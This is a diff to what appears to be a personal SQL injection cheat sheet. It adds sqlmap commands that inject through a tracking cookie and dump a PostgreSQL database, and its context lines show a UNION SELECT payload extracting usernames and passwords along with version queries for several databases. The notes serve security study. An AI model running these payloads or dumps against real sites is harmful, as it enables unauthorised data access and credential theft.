@@ -90,6 +90,15 @@
   - __`'+UNION+SELECT+username_ygmrlj,+password_jiuphc+FROM+USERS_RDINGX--`__
 
 
+
+# SQLmap
+
+- __`sqlmap -u '<url>' --cookie='Trackingid=<id_value>; session=<value>' --level2`__
+  - __if you dont the database name just run the above commands__
+
+- __`sqlmap -u '<url>' --cookie='Trackingid=<id_value>; session=<value>' --level2 --dbms=postgreSQL --dump --threads=5`__
+
+
 #  Types of database
 
 - __1. Oracle__
@@ -110,6 +119,8 @@
 - __2. Microsft    | `SELECT @@version`__
 - __3. PostgreSQL  | `SELECT version()`__
 - __4. MySQL       | `SELECT @@version`__
+
+
 
 
 
